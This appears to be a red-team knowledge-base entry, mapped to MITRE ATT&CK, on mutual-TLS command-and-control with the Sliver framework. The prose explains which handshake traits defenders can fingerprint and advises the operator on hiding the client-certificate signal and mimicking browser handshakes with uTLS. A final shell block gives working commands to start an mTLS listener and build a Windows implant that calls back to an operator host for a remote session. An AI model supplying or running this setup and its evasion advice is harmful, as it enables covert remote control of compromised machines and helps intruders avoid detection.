---
id: mtls-c2-sliver
title: Mutual-TLS C2 session (Sliver mTLS implant)
section: Command & Control
phase: Command & Control
attack:
  tactic: TA0011
  techniques: [T1573.002]
platform: [windows, network]
source: MITRE ATT&CK T1573.002; Sliver / Mythic mTLS C2
pair: mtls-c2-ja3
---

A fully-interactive session channel wrapped in mutual TLS: the implant and the
server authenticate each other with per-implant certificates, so the traffic is
encrypted end to end and can't be MITM'd by an inspecting proxy without breaking the
pinned cert. Payload contents stay opaque — but the TLS *handshake* is exposed.

The implant's crypto/extension ordering hashes to a JA3 (and the server's to a JA3S), and
that hash does survive the sleep/jitter that hides the beacon cadence — but it is a
**build-era** fingerprint, not a property of the protocol. Go's TLS stack changes its
ClientHello between releases, so a JA3 pinned to one Sliver build is stale against the next,
and an operator who fronts the implant with **uTLS** mimics a browser's hello outright and
picks a new one at will.

What mutual TLS *cannot* hide is that it is mutual: the implant has to present a **client
certificate** to authenticate to the listener, and outbound client-cert TLS to a destination
outside the enterprise PKI is rare on its own — no fingerprint list required. Treat that, not
the JA3, as the thing to keep away from a defender's view.

```sh
# Sliver: stand up an mTLS listener, then generate the matching session implant
sliver > mtls --lhost {{lhost}} --lport {{port}}
sliver > generate --mtls {{lhost}}:{{port}} --os windows --save implant.exe
```
